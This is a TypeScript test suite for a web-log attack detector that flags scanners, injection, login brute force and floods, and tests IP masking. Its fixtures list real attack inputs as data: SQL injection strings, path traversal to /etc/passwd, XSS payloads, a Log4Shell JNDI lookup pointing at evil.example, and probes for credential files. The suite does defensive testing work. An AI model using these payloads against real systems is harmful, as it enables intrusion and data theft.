import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  classifyRequest,
  detectAttacks,
  foldInternalSources,
  internalIp,
  maskIp,
  safeDecode,
  type AccessRecord
} from '../src/security/attack-signals';

const START = Date.parse('2026-10-29T12:00:00Z');
const HOUR = 60 * 60_000;
const MIN = 60_000;
const OPTS = { start: START, end: START + HOUR, bucketMs: 5 * MIN };
const BROWSER = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15';

function rec(over: Partial<AccessRecord> = {}): AccessRecord {
  return {
    t: START + MIN,
    clientIp: '198.51.100.7',
    method: 'GET',
    path: '/',
    status: 200,
    userAgent: BROWSER,
    host: 'shop.example.com',
    ...over
  };
}

function kind(path: string, userAgent = BROWSER) {
  return classifyRequest({ path, userAgent });
}

test('scanner paths', () => {
  for (const path of [
    '/.env',
    '/.env.local',
    '/api/.env',
    '/wp-admin/',
    '/wp-admin',
    '/wp-login.php',
    '/.git/config',
    '/.git/HEAD',
    '/phpMyAdmin/index.php',
    '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/cgi-bin/luci',
    '/.aws/credentials',
    '/server-status',
    '/%2eenv',
    '/%2Egit/config'
  ]) {
    assert.equal(kind(path), 'scanner', path);
  }
});

test('scanner user agents, case-insensitive', () => {
  for (const ua of [
    'sqlmap/1.7.2#stable (https://sqlmap.org)',
    'Mozilla/5.00 (Nikto/2.5.0)',
    'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)',
    'masscan/1.3',
    'Mozilla/5.0 zgrab/0.x',
    'SQLMAP'
  ]) {
    assert.equal(kind('/', ua), 'scanner', ua);
  }
});

test('injection payloads', () => {
  for (const path of [
    "/products?id=1' or 1=1--",
    "/login?user=admin' OR 'a'='a",
    '/products?id=1 UNION SELECT username,password FROM users',
    '/products?id=1+union+all+select+1,2,3',
    "/search?q=x';drop table users",
    '/search?q=1 and 1=1',
    "/item?id=1' AND sleep(5)",
    '/static/../../etc/passwd',
    '/download?file=..\\..\\windows\\win.ini',
    '/search?q=<script>alert(1)</script>',
    '/search?q=<img src=x onerror=alert(1)>',
    '/?x=${jndi:ldap://evil.example/a}'
  ]) {
    assert.equal(kind(path), 'injection', path);
  }
});

test('percent-encoded payloads are decoded', () => {
  for (const path of [
    '/products?id=1%27%20or%201%3D1--',
    '/products?id=1%27%20OR%20%27a%27%3D%27a',
    '/products?id=1%20UNION%20SELECT%20null',
    '/files/..%2f..%2fetc%2fpasswd',
    '/files/%2e%2e%2f%2e%2e%2fetc/passwd',
    '/files/..%252f..%252fetc%252fpasswd',
    '/search?q=%3Cscript%3Ealert(1)%3C/script%3E',
    '/search?q=%3cscript%3e',
    '/?q=%24%7Bjndi%3Aldap%3A%2F%2Fx%7D',
    '/?q=%2527%20or%201=1'
  ]) {
    assert.equal(kind(path), 'injection', path);
  }
});

test('malformed encoding never throws', () => {
  for (const path of ['/%', '/%E0%A4%A', '/%zz%', '/%%%%27', '/%ff%fe%fd', '/\uD800', '/a%2']) {
    assert.doesNotThrow(() => kind(path));
    assert.doesNotThrow(() => safeDecode(path));
  }
  assert.equal(kind('/%%%%27 or 1=1'), 'injection');
  assert.doesNotThrow(() =>
    classifyRequest({ path: undefined as unknown as string, userAgent: '' })
  );
  assert.equal(safeDecode('/a%20b%zz'), '/a b%zz');
});

test('benign traffic is not classified', () => {
  for (const path of [
    '/',
    '/products/42',
    '/search?q=rock+and+roll',
    "/users/o'brien",
    "/blog/don't-order-by-date",
    '/search?q=tom+and+jerry',
    '/api/v1/orders?sort=created&order=desc',
    '/environment',
    '/envelopes',
    '/.well-known/acme-challenge/abc',
    '/gitlab/readme',
    '/wp-admins-guide',
    '/script.js',
    '/docs/selecting-a-union',
    '/?redirect=%2Fdashboard%3Ftab%3Dhome',
    '/static/app.1a2b3c.js',
    '/a/b/./c'
  ]) {
    assert.equal(kind(path), null, path);
  }
  const report = detectAttacks(
    Array.from({ length: 200 }, (_, i) =>
      rec({ t: START + i * 10_000, clientIp: `198.51.100.${i % 20}`, path: `/products/${i}` })
    ),
    OPTS
  );
  assert.deepEqual(report.byKind, { scanner: 0, injection: 0, 'auth-bruteforce': 0, flood: 0 });
  assert.deepEqual(report.topSources, []);
  assert.deepEqual(report.samples, []);
  assert.equal(report.series.length, 12);
  assert.ok(
    report.series.every((b) => b.scanner + b.injection + b['auth-bruteforce'] + b.flood === 0)
  );
});

function failures(n: number, spanMs: number, over: Partial<AccessRecord> = {}): AccessRecord[] {
  return Array.from({ length: n }, (_, i) =>
    rec({
      t: START + MIN + Math.round((i * spanMs) / Math.max(1, n - 1)),
      clientIp: '203.0.113.9',
      method: 'POST',
      path: '/login',
      status: i % 2 ? 401 : 403,
      ...over
    })
  );
}

test('auth brute force needs more than 20 failures inside 5 minutes', () => {
  assert.equal(detectAttacks(failures(21, 5 * MIN - 1), OPTS).byKind['auth-bruteforce'], 21);
  assert.equal(detectAttacks(failures(21, 5 * MIN), OPTS).byKind['auth-bruteforce'], 0);
  assert.equal(detectAttacks(failures(20, 60_000), OPTS).byKind['auth-bruteforce'], 0);
});

test('auth brute force counts per IP and per path, ignoring the query', () => {
  const split = failures(30, MIN).map((r, i) => ({ ...r, path: i % 2 ? '/login' : '/admin' }));
  assert.equal(detectAttacks(split, OPTS).byKind['auth-bruteforce'], 0);
  const ips = failures(30, MIN).map((r, i) => ({
    ...r,
    clientIp: i % 2 ? '203.0.113.9' : '203.0.113.10'
  }));
  assert.equal(detectAttacks(ips, OPTS).byKind['auth-bruteforce'], 0);
  const query = failures(25, MIN).map((r, i) => ({ ...r, path: `/login?attempt=${i}` }));
  assert.equal(detectAttacks(query, OPTS).byKind['auth-bruteforce'], 25);
  const ok = failures(25, MIN, { status: 200 });
  assert.equal(detectAttacks(ok, OPTS).byKind['auth-bruteforce'], 0);
});

test('auth brute force only flags the failures inside a dense window', () => {
  const slow = Array.from({ length: 5 }, (_, i) =>
    rec({ t: START + i * 10 * MIN, clientIp: '203.0.113.9', path: '/login', status: 401 })
  );
  const burst = failures(22, 2 * MIN, { t: 0 }).map((r, i) => ({
    ...r,
    t: START + 50 * MIN + i * 1000
  }));
  const report = detectAttacks([...slow, ...burst], OPTS);
  assert.equal(report.byKind['auth-bruteforce'], 22);
  assert.deepEqual(report.topSources, [
    { ip: '203.0.113.9', count: 22, kinds: ['auth-bruteforce'] }
  ]);
  assert.equal(report.series[10]['auth-bruteforce'], 22);
});

function crowd(ips: number, perIp: number): AccessRecord[] {
  const out: AccessRecord[] = [];
  for (let i = 0; i < ips; i++) {
    for (let j = 0; j < perIp; j++) {
      out.push(rec({ t: START + j * 1000, clientIp: `198.51.100.${i}`, path: `/p/${j}` }));
    }
  }
  return out;
}

function hammer(n: number, ip = '192.0.2.50'): AccessRecord[] {
  return Array.from({ length: n }, (_, i) => rec({ t: START + i * 100, clientIp: ip, path: '/' }));
}

test('flood is over 10x the median per-IP rate with at least 300 requests', () => {
  const r = detectAttacks([...crowd(5, 40), ...hammer(401)], OPTS);
  assert.equal(r.byKind.flood, 401);
  assert.deepEqual(r.topSources[0], { ip: '192.0.2.50', count: 401, kinds: ['flood'] });
  assert.equal(detectAttacks([...crowd(5, 40), ...hammer(400)], OPTS).byKind.flood, 0);
});

test('flood needs an absolute minimum of 300 requests', () => {
  assert.equal(detectAttacks([...crowd(5, 5), ...hammer(299)], OPTS).byKind.flood, 0);
  assert.equal(detectAttacks([...crowd(5, 5), ...hammer(300)], OPTS).byKind.flood, 300);
});

test('flood needs at least 5 distinct IPs to compute a median', () => {
  assert.equal(detectAttacks([...crowd(3, 2), ...hammer(5000)], OPTS).byKind.flood, 0);
  assert.equal(detectAttacks([...crowd(4, 2), ...hammer(5000)], OPTS).byKind.flood, 5000);
});

test('records outside the range are ignored', () => {
  const r = detectAttacks(
    [
      rec({ path: '/.env', t: START - 1 }),
      rec({ path: '/.env', t: START + HOUR }),
      rec({ path: '/.env', t: START })
    ],
    OPTS
  );
  assert.equal(r.byKind.scanner, 1);
  assert.equal(r.series[0].scanner, 1);
});

test('series, top sources and samples', () => {
  const records = [
    rec({ t: START + 1000, clientIp: '203.0.113.1', path: '/.env' }),
    rec({ t: START + 2000, clientIp: '203.0.113.1', path: '/wp-login.php', status: 404 }),
    rec({ t: START + 7 * MIN, clientIp: '203.0.113.2', path: "/q?id=1' or 1=1" }),
    rec({ t: START + 8 * MIN, clientIp: '203.0.113.1', path: '/x', userAgent: 'nuclei' }),
    rec({ t: START + 9 * MIN, clientIp: '198.51.100.1', path: '/fine' })
  ];
  const r = detectAttacks(records, OPTS);
  assert.deepEqual(r.byKind, { scanner: 3, injection: 1, 'auth-bruteforce': 0, flood: 0 });
  assert.equal(r.series[0].t, START);
  assert.equal(r.series[1].t, START + 5 * MIN);
  assert.equal(r.series[0].scanner, 2);
  assert.equal(r.series[1].scanner, 1);
  assert.equal(r.series[1].injection, 1);
  assert.deepEqual(r.topSources, [
    { ip: '203.0.113.1', count: 3, kinds: ['scanner'] },
    { ip: '203.0.113.2', count: 1, kinds: ['injection'] }
  ]);
  assert.deepEqual(r.samples[0], {
    t: START + 8 * MIN,
    ip: '203.0.113.1',
    method: 'GET',
    path: '/x',
    status: 200,
    kind: 'scanner'
  });
  assert.equal(r.samples.length, 4);
});

test('a request can carry several kinds', () => {
  const brute = failures(25, MIN, { path: '/wp-login.php' });
  const r = detectAttacks(brute, OPTS);
  assert.equal(r.byKind.scanner, 25);
  assert.equal(r.byKind['auth-bruteforce'], 25);
  assert.deepEqual(r.topSources[0].kinds, ['scanner', 'auth-bruteforce']);
  assert.equal(r.topSources[0].count, 25);
});

test('samples cap at 50 and keep every kind represented', () => {
  const noisy = [...crowd(5, 10), ...hammer(2000)];
  const probe = rec({ t: START + 30 * MIN, clientIp: '203.0.113.77', path: '/.git/config' });
  const r = detectAttacks([...noisy, probe], OPTS);
  assert.equal(r.samples.length, 50);
  assert.ok(r.samples.some((s) => s.kind === 'scanner'));
  assert.ok(r.samples.some((s) => s.kind === 'flood'));
  for (let i = 1; i < r.samples.length; i++) assert.ok(r.samples[i - 1].t >= r.samples[i].t);
});

test('a huge range does not explode the bucket count', () => {
  const r = detectAttacks([rec({ path: '/.env' })], {
    start: START,
    end: START + 365 * 24 * HOUR,
    bucketMs: 1
  });
  assert.ok(r.series.length <= 10_000);
  assert.equal(
    r.series.reduce((n, b) => n + b.scanner, 0),
    1
  );
});

test('maskIp masks IPv4 to /24', () => {
  assert.equal(maskIp('203.0.113.42'), '203.0.113.0/24');
  assert.equal(maskIp('203.0.113.42:51234'), '203.0.113.0/24');
  assert.equal(maskIp('  10.1.2.3 '), '10.1.2.0/24');
  assert.equal(maskIp('::ffff:203.0.113.42'), '203.0.113.0/24');
  assert.equal(maskIp('256.1.1.1'), 'unknown');
  assert.equal(maskIp('1.2.3'), 'unknown');
});

test('maskIp masks IPv6 to /48', () => {
  assert.equal(maskIp('2001:db8:85a3:8d3:1319:8a2e:370:7348'), '2001:db8:85a3::/48');
  assert.equal(maskIp('2001:0DB8:0000:0000:0000:0000:0000:0001'), '2001:db8::/48');
  assert.equal(maskIp('2001:db8::1'), '2001:db8::/48');
  assert.equal(maskIp('2a01:4f8:c0c:1234::1'), '2a01:4f8:c0c::/48');
  assert.equal(maskIp('[2001:db8:abcd:12::1]:443'), '2001:db8:abcd::/48');
  assert.equal(maskIp('fe80::1%eth0'), 'fe80::/48');
  assert.equal(maskIp('::1'), '::/48');
  assert.equal(maskIp('::'), '::/48');
  assert.equal(maskIp('2001:db8:::1'), 'unknown');
  assert.equal(maskIp('1:2:3:4:5:6:7'), 'unknown');
  assert.equal(maskIp('not-an-ip'), 'unknown');
  assert.equal(maskIp(''), 'unknown');
});

test('internalIp spots cluster, private and loopback addresses and leaves public ones alone', () => {
  for (const ip of [
    '10.244.2.22',
    '172.16.0.1',
    '172.31.255.1',
    '192.168.1.5',
    '127.0.0.1',
    '100.64.0.9',
    '169.254.1.1',
    'fd00::1',
    'fe80::1',
    '::1',
    '::ffff:10.0.0.4',
    '10.0.0.1:443'
  ]) {
    assert.equal(internalIp(ip), true, ip);
  }
  for (const ip of ['203.0.113.42', '172.32.0.1', '8.8.8.8', '2001:db8::1', '', 'garbage']) {
    assert.equal(internalIp(ip), false, ip);
  }
});

test('internal sources fold into one hidden source so a node address never poses as the attacker', () => {
  const out = foldInternalSources([
    { ip: '10.244.2.22', count: 18, kinds: ['scanner'] },
    { ip: '203.0.113.9', count: 5, kinds: ['injection'] },
    { ip: '10.244.4.116', count: 3, kinds: ['injection'] }
  ]);
  assert.deepEqual(out, [
    { ip: '', count: 21, kinds: ['scanner', 'injection'], hidden: true },
    { ip: '203.0.113.9', count: 5, kinds: ['injection'] }
  ]);
});
